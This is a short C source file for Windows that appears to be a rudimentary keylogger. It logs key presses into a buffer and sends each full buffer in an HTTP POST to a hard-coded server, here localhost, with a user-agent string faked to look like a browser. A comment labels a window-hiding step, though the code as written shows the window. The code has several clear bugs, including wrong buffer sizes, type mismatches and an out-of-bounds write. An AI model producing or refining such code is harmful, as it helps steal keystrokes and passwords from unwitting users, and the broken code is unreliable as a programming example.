#include <stdio.h>
#include <Windows.h>
#include <WinInet.h>
#include <stdbool.h>
#define N 64

#pragma comment(lib, "wininet.lib")

int post(char capture[]) {
    int captureByteLength = N * sizeof(capture);
	
	char* hdrs = "Content-Type: text/plain";
	LPCSTR accept[2] = { "text/plain", NULL };

	HINTERNET hSession = InternetOpenA("Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 92.0.4515.131 Safari / 537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
	HINTERNET hConnect = InternetConnectA(hSession, "localhost", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, accept, 0, 0);

	bool send = HttpSendRequestA(hRequest, hdrs, strlen(hdrs), capture, captureByteLength);
	//if (!send) {
		//printf("%d", GetLastError());
	//}

	return 1;
}

int main(void) {
	int capture[N], key, l = 0;

	// Hide window
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 1);

	while (1) {
		Sleep(20);
		if (kbhit()) {
			key = getch();

			if (l == N) {
				capture[l + 1] = "\0";
				post(capture);

				capture[0] = "\0";
				l = 0;
			}

			if (l < N) {
				capture[l] = key;
				printf("%d ", l);
				l++;
			}
		}
	}

	return 1;
}